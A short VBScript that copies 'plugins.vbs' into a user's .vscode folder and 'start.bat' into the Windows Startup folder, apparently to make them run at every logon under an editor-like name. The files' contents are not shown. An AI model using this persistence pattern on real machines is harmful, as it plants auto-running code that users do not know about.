Option Explicit
DIM fso    
Set fso = CreateObject("Scripting.FileSystemObject")

fso.CopyFile "./plugins.vbs", "C:\Users\student\.vscode\plugins.vbs"
fso.CopyFile "./start.bat", "C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"